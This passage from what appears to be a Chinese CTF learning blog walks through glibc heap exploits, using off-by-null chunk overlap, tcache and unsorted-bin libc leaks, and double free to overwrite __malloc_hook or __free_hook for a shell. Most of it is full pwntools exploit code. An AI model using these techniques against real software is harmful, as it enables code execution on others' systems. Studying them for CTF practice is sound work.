add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>至于偏移啥的，都是自己调试计算出来的。但那个0x71是因为，你申请之后unsortbins还有chunk。你最好还是别动，因为我怕又报错。进而修改掉fastbins里面chunk的fd指针。使其指向fake_chunk位置</p>
<p><img src="https://s2.loli.net/2024/08/19/4PhodtiJ2GVTLkc.png" alt="30f068e102774320b60cbfa748672d75.png"></p>
<p>接下来就是申请过去，然后把__malloc_hook修改为one_gadget。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>oog<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>最后getshell</p>
<p><img src="https://s2.loli.net/2024/08/19/m6sglfjXMwNotJR.png" alt="5252281a67554f09b56a2ffb48a232fa.png"></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    oog <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2be</span><span class="token punctuation">,</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span><span class="token comment">#2.27</span>
    
    <span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
        choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token comment">#0-6</span>
        add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#7-13</span>
        add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#14 - 20</span>
        add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token comment">#21 - 27</span>
    
    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#28</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#29</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#30</span>
    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'dddd'</span><span class="token punctuation">)</span><span class="token comment">#31</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        free<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment">#0-27被free掉了</span>
    <span class="token comment">#将上面将对应大小的tcache填满</span>

    free<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span>
    free<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>
    
    <span class="token comment"># add(0xc0,'aaaa')#1</span>
    <span class="token comment"># add(0x20,'aaaa')#2</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#1</span>

    show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    main_arenas <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span>
    __malloc_hook <span class="token operator">=</span> main_arenas <span class="token operator">-</span> <span class="token number">0x10</span>
    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
    __free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>
    fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span>

    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'main_arenas = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arenas<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__malloc_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'__free_hook = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>__free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'fake_chunk = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#2</span>

    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#3，此时chunk_3和chunk_0重叠了，不能用double free</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span><span class="token comment">#4</span>
    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#5</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#6 隔离top chunk</span>

    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x170</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#3</span>
    free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    
    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#这一步导致其进入到fastbins里面</span>
    add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#3</span>
    add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#4</span>
    
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>oog<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>  
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
      <categories>
        <category>学习</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>二进制</tag>
        <tag>tcache</tag>
        <tag>高libc</tag>
      </tags>
  </entry>
  <entry>
    <title>高版本Tcache+off-by-One</title>
    <url>/2024/07/24/%E9%AB%98%E7%89%88%E6%9C%ACtcache-off-by-one/</url>
    <content><![CDATA[<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>利用off-by-one实现堆向前重叠，在通过不断割掉unsortbins里面的chunk块达到泄露libc基地址，后面来利用前面的堆重叠来实现doule free将chunk申请到__free_hook上面将其修改为system，最后getshell。</p>
<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>保护全开</p>
<p>main函数，经典菜单题,没有edit函数。感觉基本上漏洞点肯定在add（）函数里面</p>
<p><img src="https://s2.loli.net/2024/08/19/Z9FxX1U3Iwm7EiJ.png" alt="7eb2d33ff08e47bf8090ba7306a18ffc.png"></p>
<p>delete函数，指针置0了没有uaf</p>
<p><img src="https://s2.loli.net/2024/08/19/fxum4vkcXia1KjS.png" alt="73b33edf07a943cfb65133ae007e4828.png"></p>
<p>add函数，存在off-by-null，而且只给申请15个chunk</p>
<p><img src="https://s2.loli.net/2024/08/19/Wma5IAe2StEnN3x.png" alt="a6fcc88eaf094ec58b2d4cdb78ced075.png"></p>
<h5 id="结合exp分析"><a href="#结合exp分析" class="headerlink" title="结合exp分析"></a>结合exp分析</h5><p>先把tcache填满，申请的大小必须大于0xf0，因为off-by-null会将低位修改为0，如果你是0x90就会变成0x00</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>把序号为8的chunk的pre_size位修改为0x100，同时序号为7的chunk进入到unsortbins里面（此时需要将其的fd和bk指针给到序号为8的chunk），制造假chunk头，0x120为前面序号为7和8的chunk大小和</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#制造假chunk头，0x120为前面序号为7和8的chunk大小和，把序        </span>
号为<span class="token number">9</span>的chunk的pre_size位修改为<span class="token number">0x100</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>此时的内存对应的chunk序号为8</p>
<p><img src="https://s2.loli.net/2024/08/19/qRQ4nFuVDXpAWLt.png" alt="11c270ae2b8c44b8b601cd2b3282247c.png"></p>
<p>堆重叠，此时合并序号为7，8，9的chunk进入到unsortbins里面（但其实序号为8的chunk根本没有free，可供我们利用），大小为0x220，两次申请特殊大小的chunk，从unsortbins里面分割出来chunk其大小为序号为7的chunk，这样就可以将其fd和bk指针给到0x55c0a9334a60处。为什么不直接申请0xf0，因为直接申请bins会将tcache里面的chunk给你。包括第二个chunk的size为0x20，这是为后面doule free做准备。本人也是无意之间做到的，实属运气加成了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment">#堆向前合并掉序号为8的chunk</span>
add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#这两个chunk的大小加起来正好等于序号为7的chunk</span>
add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#此chunk的大小必须为属于序号为8的chunk的大小</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>show序号为8的chunk就可以得到unsortbins_addr,</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

__malloc_hook <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span><span class="token operator">-</span><span class="token number">0x10</span>

libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span><span class="token number">0x23</span>

free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"free_hook  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>日志结果</p>
<p><img src="https://s2.loli.net/2024/08/19/cL6yFxEtOrzM3CY.png" alt="7dbea093fbc443228769956bf6cbbf34.png"></p>
<p>此时想办法将free_hook修改为system。将堆重叠的那块区域给申请出来。这样就可以构成double free</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"> add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment">#分割unsortbins的大小。其实是为了让序号为8的那块chunk归我所用</span>

delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">#double free</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>查看bins，可以看到大小为0x20的形成了双链结构</p>
<p><img src="https://s2.loli.net/2024/08/19/jxwfcJGbgS4LvXz.png" alt="e519e95e57584651bf7ea54c756a17a4.png"></p>
<p>最后就是正常的步骤</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将其的fd指针指向free_hook</span>

add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#将0x55cd056ba60的chunk申请掉</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将__free_hook修改为system的地址</span>

delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>最后getshell</p>
<p><img src="https://s2.loli.net/2024/08/19/VEUiIOgPv9RsjBe.png" alt="63a402e8a92c4c8bb7875c0f89f2b552.png"></p>
<h5 id="最后完整的exp"><a href="#最后完整的exp" class="headerlink" title="最后完整的exp"></a>最后完整的exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>index<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#此chunk需要和前面的chunk大小保持一直</span>
